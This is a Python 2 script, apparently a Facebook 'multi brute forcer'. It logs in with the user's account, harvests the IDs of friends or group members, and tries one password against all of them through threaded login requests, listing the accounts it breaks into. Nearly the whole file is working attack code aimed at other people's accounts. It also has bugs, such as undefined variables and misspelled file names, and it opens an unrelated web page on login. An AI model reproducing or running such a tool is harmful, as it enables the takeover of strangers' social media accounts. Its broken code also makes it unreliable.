#!/usr/bin/python
# -*- coding: utf-8 -*-
# Multi Brute Forcers (MBF)
# Coded by Senja
# Github: github.com/stepbystepexe/Pesbukmbf

import platform, os, sys, cookielib, re, urllib2, urllib, threading, time, random
from mechanize import Browser as browser

def printf(x,e=0):
        f = 'mhkbpcP'
        for o in f:
                j = f.index(o)
                x = x.replace('!%s'%o,'\x1b[%s;1m'%str(31+j))
        x += '\x1b[0m'
        x = x.replace('!0','\x1b[0m')
        if e != 0:
                sys.stdout.write(x)
        else:
                sys.stdout.write(x+'\n')

if platform.python_version().split('.')[0] != '2':
        printf('[!] You are using a python version %s please use the version 2.x.x'%v().split(' ')[0])
        sys.exit(1)

try:
  import mechanize
except ImportError:
        printf('[!] It looks like the Mechanize module hasn\'t been installed yet\n[!] pip2 install mechanize')
        sys.exit(1)

br = 0
log = 0
id_bfriend = []
id_bgroups = []
fid_bfriend = []
fid_bgroups = []

class pesbuk(threading.Thread):
        def __init__(self,x,f):
                threading.Thread.__init__(self)
                self.id = x
                self.o = 0
                self.f = f
        def update(self):
                return self.o,self.id
        def run(self):
                try:
                        data = urllib2.urlopen(urllib2.Request(url='https://m.facebook.com/login.php',data=urllib.urlencode({'email':self.id,'pass':self.f}),headers={'User-Agent':'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16'}))
                except KeyboardInterrupt:
                        sys.exit(1)
                except:
                        self.o = 4
                        sys.exit(1)
                if 'm_sess' in data.url or 'save-device' in data.url:
                        self.o = 1
                elif 'checkpoint' in data.url:
                        self.o = 2
                else:
                        self.o = 3

def loads():
    tix = [
     '.   ', '..  ', '... ']
    for o in tix:
        print '\r\x1b[0m[\x1b[94;1m\xe2\x97\x8f\x1b[0m] \x1b[0mLoading ' + o,
        sys.stdout.flush()
        time.sleep(1)

def crack(o):
        while 1:
                x = input_one('\n\x1b[0m[\x1b[95;1m?\x1b[0m] \x1b[77;1mPassword')
                if len(x) < 6:
                        print('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mEnter minimal 6 letters')
                else:
                        break
        return crack_pb(o,x)

def display(account,passw,data):
        checkpoint = []
        false = 0
        works = []
        for x in account:
                o,id = x
                if o == 1:
                        works.append(id)
                elif o == 2:
                        checkpoint.append(id)
                elif o == 3:
                        wrongs += 1
        print('\x1b[0m[\x1b[92;1m+\x1b[0m] Working \x1b[77;1m%d \x1b[0m'%len(works))
        if len(works) != 0:
                for x in works:
                        print('\n\x1b[0m[\x1b[94;1m#\x1b[0m] \x1b[77;1m%s => \x1b[0m[%s]'%(x,passw))
        print('\x1b[0m[\x1b[93;1m*\x1b[0m] Checkpoint \x1b[77;1m%d \x1b[0m'%len(checkpoint))
        if len(checkpoint) != 0:
                for x in checkpoint:
                        print('\n\x1b[0m[\x1b[93;1m#\x1b[0m] \x1b[77;1m%s => \x1b[0m[%s]'%(x,passw))
        print('\x1b[0m[\x1b[91;1m-\x1b[0m] \x1b[77;1mFailed    \x1b[0m'+str(false))
        x = input_one('\n\x1b[0m[\x1b[95;1m?\x1b[0m] \x1b[77;1mNot satisfied with your results, want to try again [Y/n]',['Y','N'])
        if x.upper() == 'Y':
                return crack(data)
        else:
                return menu()

def crack_pb(data,passw):
        account = []
        print('\x1b[0m[\x1b[93;1m*\x1b[0m] \x1b[77;1mCrack \x1b[0m%d \x1b[77;1mAccount with a Password \x1b[0m[%s]'%(len(data),passw))
        print('\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[77;1mCracking  \x1b[0m%',1)
        sys.stdout.flush()
        count0,count1 = 0,0
        f = []
        for o in data:
                o = o.replace(' ','')
                o = o.replace('\n','')
                if len(o) != 0:f.append(pesbuk(x,passw))
                count1 += 1
        for o in f:
                o.daemon = True
                try:o.start()
                except KeyboardInterrupt:exit()
        h_error = []
        error = 0
        while 1:
                try:
                        for o in f:
                                status,id = o.update()
                                if status != 0:
                                        print('\n\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mCracking  \x1b[0m%d %s '%(int(float((float(count0)/float(count1))*100)),'%'),1)
                                        sys.stdout.flush()
                                        del(f[f.index(o)])
                                        if status == 4:
                                                h_error.append(id)
                                                if h_error.count(id) == 3:
                                                        pass
                                                else:
                                                        f.append(pesbuk(id,passw))
                                                        f[len(f)-1].daemon = True
                                                        f[len(f)-1].start()
                                        else:
                                                count0 += 1
                                                account.append((status,id))
                except KeyboardInterrupt:
                        exit()
                try:
                        if threading.activeCount() == 1:break
                except KeyboardInterrupt:
                        exit()
        print('\x1b[0m[\x1b[93;1m*\x1b[0m] \x1b[77;1mCracking  100%      ')
        display(account,passw,data)

def browser():
        global br
        reload(sys)
        sys.setdefaultencoding('utf8')
        br = mechanize.Browser()
        br.set_handle_robots(False)
        br.set_handle_equiv(True)
        br.set_handle_referer(True)
        br.set_cookiejar(cookielib.LWPCookieJar())
        br.set_handle_redirect(True)
        br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
        br.addheaders = [('User-Agent','Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def datacount():
        global fid_bgroups,fid_bfriend
        try:
                fid_bgroups = open(os.sys.path[0]+'/MBFgroups.txt','r').readlines()
        except:pass
        try:
                fid_bfriend = open(os.sys.path[0]+'/MBFfriend.txt','r').readlines()
        except:pass

def saved():
        if len(id_bgroups) != 0:
                print('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mSaving results from group')
                try:
                        open(os.sys.path[0]+'/MBFgroups.txt','w').write('\n'.join(id_bgroups))
                        print('\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[77;1mSaved successfully MBFgroups.txt')
                except:
                        print('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mSaving failed')
        if len(id_bfriend) != 0:
                print('\x1b[0m[\x1b[94;1m#\x1b[0m] \x1b[77;1mSave friend list results')
                try:
                        open(os.sys.path[0]+'/MBFfriend.txt','w').write('\n'.join(id_bfriend))
                        print('\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[77;1mSaved successfilly MBFfriend.txt')
                except:
                        print('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1Saving failed')

def exit():
        saved()
        print('\n\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mExit the program!\n')
        sys.exit(1)

def input_one(o,f=0):
        while 1:
                try:
                        x = raw_input('\x1b[0m%s: \x1b[77;1m'%o)
                except:
                        print('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mFailed')
                        exit()
                if f:
                        if x.upper() in f:
                                break
                        else:
                                print('\x1b[0m[\x1b[96;1m+\x1b[0m] \x1b[77;1mEnter the options')
                                continue
                else:
                        if len(x) == 0:
                                print('\x1b[0m[\x1b[94;1m+\x1b[0m] \x1b[77;1mEnter correctly')
                                continue
                        else:
                                break
        return x

def input_two(i,x):
        while 1:
                try:
                        o = int(input_one(i))
                except:
                        print('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mWrong choice')
                        continue
                if o in x:
                        break
                else:
                        print('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mWrong choice')
        return o

def next_one():
        global fid_bgroups
        if len(fid_bgroups) != 0:
                x = input_one('\x1b[0m[\x1b[95;1m?\x1b[0m] \x1b[77;1mResearch group id results/continue \x1b[0m[R/L]',['R','L'])
                if x.upper() == 'L':
                        return crack(fid_bgroups)
                else:
                        os.remove(os.sys.path[0]+'/MBFgroups.txt')
                        fid_bgroups = []
        return 0

def next_two():
        global fid_bfriend
        if len(fid_bfriend) != 0:
                x = input_one('\x1b[0m[\x1b[95;1m?\x1b[0m] \x1b[77;1mResearch the results of your id friend/continue [R/L]',['R','L'])
                if x.upper() == 'L':
                        return crack(fid_bfriend)
                else:
                        os.remove(os.sys.path[0]+'/MBFtriend.txt')
                        fid_bfriend = []
        return 0

def open_pb(o):
        try:
                x = br.open(o)
                br._factory.is_html = True
                x = x.read()
        except:
                print('\n\x1b[0m[\x1b[95;1mx\x1b[0m] \x1b[77;1mOpen failed \x1b[0m' +str(o))
                exit()
        if '<link rel="redirect" href="' in x:
                return open_pb(br.find_link().url)
        else:
                return x

def login():
        global log
        username = input_one('\x1b[0m[\x1b[92;1m+\x1b[0m] Username')
        password = input_one('\x1b[0m[\x1b[93;1m*\x1b[0m] Password')
        loads()
        open_pb('https://m.facebook.com')
        br.select_form(nr=0)
        br.form['email']=username
        br.form['pass']=password
        br.submit()
        url = br.geturl()
        if 'save-device' in url or 'm_sess' in url:
                open_pb('https://mobile.facebook.com/home.php')
                name = br.find_link(url_regex='logout.php').text
                name = re.findall(r'\((.*a?)\)',name)[0]
                os.system('xdg-open https://github.com/thedarksec/')
                print('\x1b[0m[\x1b[94;1m#\x1b[0m] \x1b[77;1mWelecome %s'%name)
                print('\x1b[0m[\x1b[96;1m*\x1b[0m] \x1b[77;1mHopefully this is a lucky day your')
                log = 1
        elif 'checkpoint' in url:
                print('\n\x1b[0m[\x1b[95;1m#\x1b[0m] \x1b[77;1mAccount Has Banned Checkpoint\n\x1b[0m[\x1b[96;1m$\x1b[0m] \x1b[77;1mTry login in with Opera Mini')
                exit()
        else:
                print('\x1b[0m[\x1b[95;1mx\x1b[0m] \x1b[77;1mLogin failed')

def idgroups():
        if log != 1:
                print('\n\x1b[0m[\x1b[91;1m/\x1b[0m] \x1b[77;1mLogin Account Pesbuk \x1b[0m[\x1b[91;1m/\x1b[0m]')
                login()
                if log == 0:
                        exit()
        next = cracks_id_groups0()
        while 1:
                cracks_id_groups1(open_pb(next))
                try:
                        next = br.find_link(url_regex='/browse/group/members/').url
                except:
                        print('\n\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mCan only take \x1b[0m%d id'%len(id_bgroups))
                        break
        saved()
        x = input_two('\x1b[0m[\x1b[95;1m?\x1b[0m] \x1b[77;1mCrack right away \x1b[0m[Y/n]',['Y','N'])
        if x.upper() == 'Y':
                return crack(id_bgroups)
        else:
                return menu()

def cracks_id_friend(r):
        for o in re.findall(r'/friends/hovercard/mbasic/\?uid=(.*?)&',r):
                id_bfriend.append(o)

def idfriend():
        if log != 1:
                print('\n\x1b[0m[\x1b[91;1m/\x1b[0m] \x1b[77;1mLogin Account Pesbuk \x1b[0m[\x1b[91;1m/\x1b[0m]')
                login()
                if log == 0:
                        exit()
        print('\n\x1b[0m[\x1b[93;1m*\x1b[0m] \x1b[77;1mCollecting friend id')
        open_pb('https://m.facebook.com/friends/center/mbasic/?fb_ref=bm&sr=1&ref_component=mbasic_bookmark&ref_page=XMenuController')
        counts = br.find_link(url_regex='/friends/center/friends/').text
        counts = re.findall(r'\((.*a?)\)',counts)[0]
        print('\x1b[0m[\x1b[92;1m+\x1b[0m] \x1b[77;1mTake \x1b[0m%s \x1b[77;1mid friend \x1b[0m'%counts)
        cracks_id_friend(open_pb('https://m.facebook.com/friends/center/friends/?fb_ref=fbm&ref_component=mbasic_bookmark&ref_page=XMenuController'))
        try:
                next = br.find_link(url_regex='friends_center_main').url
        except:
                if len(id_friend) != 0:
                        print('\x1b[0m[\x1b[94;1m#\x1b[0m] \x1b[77;1mCan only take \x1b[0m%d id'%len(id_friend))
                else:
                        print('\x1b[0m[\x1b[91;1m!\x1b[0m] \x1b[77;1mCanceled')
                        exit()
        while 1:
                cracks_id_friend(open_pb(next))
                print('\n\x1b[0m[\x1b[96;1m+\x1b[0m] m%s \x1b[77;1mWas taken id \x1b[0m'%len(id_bfriend),1)
                sys.stdout.flush()
                try:
                        next = br.find_link(url_regex='friends_center_main').url
                except:
                        print('\n\x1b[0m[\x1b[93;1m*\x1b[0m] \x1b[77;1mCan only take \x1b[0m%d id'%len(id_bfriend))
                        break
        saved()
        x = input_two('\x1b[0m[\x1b[95;1m?\x1b[0m] \x1b[77;1mCrack right away \x1b[0m[Y/n]',['Y','N'])
        if x.upper() == 'Y':
                return crack(id_bfriend)
        else:
                return menu()

def menu():
        os.system('clear')
        os.system('reset')
        time.sleep(1)
        print('\n\n     \x1b[0;41;31m[ ]\x1b[0m~\x1b[0;42;32m[ ]\x1b[0m~\x1b[0;44;34m[ ]\x1b[0m        \x1b[0;40;37m[-]\x1b[0m\n          |              |\n\x1b[106;96m[]\x1b[100;90m[]\x1b[0m~\x1b[4m\x1b[0;90;46;1m Hek \x1b[0;97;45;1m Pesbuk \033[0;90;43;1m   MBF   \033[0m~\x1b[103;93m[]\x1b[102;92m[]\x1b[105;95m[]\x1b[107;97m[]\x1b[0m\n              \x1b[1;77m/\x1b[0m\n     \x1b[0;90;47;1m * \x1b[0;1;77;104m Coded by \x1b[0;1;77;101m # Senja \x1b[0m\n\n')
        print('\x1b[0m[\x1b[91;1m/\x1b[0m] \x1b[77;1mPesbuk Multi Brute Forcers \x1b[0m[\x1b[91;1m/\x1b[0m]\n\x1b[0m[\x1b[94;1m1\x1b[0m] Crack From Friend\n\x1b[0m[\x1b[93;1m2\x1b[0m] Crack From Groups\n\x1b[0m[\x1b[92;1m3\x1b[0m] Exit\n')
        x = input_two('\x1b[0m[\x1b[91;1m-\x1b[0m] \x1b[77;1mSelect an option\x1b[0m',[1,2,3])
        if x == 2:
                next_one()
                idgroups()
        elif x == 1:
                next_two()
                idfriend()
        elif x == 3:
                exit()

datacount()
browser()
menu()
